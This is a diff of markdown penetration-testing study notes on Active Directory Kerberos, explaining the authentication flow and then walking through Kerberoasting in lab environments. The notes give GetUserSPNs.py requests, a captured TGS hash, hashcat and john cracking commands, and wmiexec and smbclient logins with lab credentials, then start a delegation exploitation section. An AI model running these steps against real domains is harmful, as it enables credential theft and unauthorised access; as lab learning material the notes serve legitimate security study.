@@ -1,11 +1,20 @@
-## Kerberos
+# Kerberos
 
-### Kerberoasting
+## Kerberos authentication
+
+The user makes an AS-REQ to the Key Distribution Centre (KDC) on the DC that includes a timestamp encrypted with the user's NTLM hash. Essentially, this is the request for a Ticket Granting Ticket (TGT). The DC checks the information and sends the TGT to the user. This TGT is signed with the KRBTGT account's password hash that is only stored on the DC. The user can now send this TGT to the DC to request a Ticket Granting Service (TGS) for the resource that the user wants to access. If the TGT checks out, the DC responds to the TGS that is encrypted with the NTLM hash of the service that the user is requesting access for. The user then presents this TGS to the service for access, which can verify the TGS since it knows its own hash and can grant the user access.  
+
+![Kerberos auth](../.res/2022-08-01-13-54-27.png)  
+
+Source: [TryHackMe - Persisting AD](https://tryhackme.com/room/persistingad)
+
+## Kerberoasting
 
 - Any valid user gets a ticket with kerberos to access a service (SQL for instance)
 - Tool: GetUsersSPNS.py - Impacket
 - Get a hash using the tool
-  ```
+  
+  ```bash
   ┌──(root💀kali)-[~kali]
   └─# GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 10.0.2.5 -request
   /usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
@@ -17,10 +26,12 @@
 
   $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb60bb[STRIPPED]7e35f1a787901409e16bc
   ```
-  - If we get this error `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` we need to coordinate our time with the server time using ntpdate 
-     - `sudo apt install ntpdate`
+
+  - If we get this error `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` we need to coordinate our time with the server time using ntpdate
+- `sudo apt install ntpdate`
      - `sudo ntpdate 10.10.10.100`
-        ```
+
+        ```bash
         5 Mar 19:42:53 ntpdate[19369]: step time server 10.10.10.100 offset +426.954203 sec
         ```
   - And then you should be able to rerun and actually get the hash
@@ -39,31 +50,31 @@
   ```
 - We need TGS which is 13100
 - Crack the hash with hachcat (for it to work I needed to have 4gb on my vm)
-  ```
+  ```bash
   ┌──(root💀kali)-[~/active-directory]
   └─# hashcat -m 13100 hashkerb.txt /usr/share/wordlists/rockyou.txt -O filename
-  ```
+  ```bash
 - Crack the hash with john
   - Alternatively we can use john
-  ```
+  ```bash
   john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerbhash.txt
   ```
 
 - We get the password
-  ```
+  ```bash
   $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb6[STRIPPED]6bc:MYpassword123#
   ```
 - After getting a password, we could connect to an smbshare or get a shell
 
-  ```
+  ```python
   python3 wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
   ```
   or
-  ```
+  ```bash
   smbclient \\\\10.10.10.100\\Users -U active.htb\\Administrator
   ```
 
-### Exploiting Kerberos Delegation
+## Exploiting Kerberos Delegation
 
 The practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs to access a SQL database hosted on the database server for the web application that it is hosting. Without delegation, we would probably use an AD service account and provide it with direct access to the database. When requests are made on the web application, the service account would be used to authenticate to the database and recover information.
 
@@ -71,7 +82,7 @@ However, we can allow this service account to be delegated to the SQL server ser
 
 Source: [TryHackMe](https://tryhackme.com/room/exploitingad)
 
-#### Example
+### Example
 
 - Enerumerate available delegations with a privileged user
   - `Import-Module C:\Tools\PowerView.ps1`
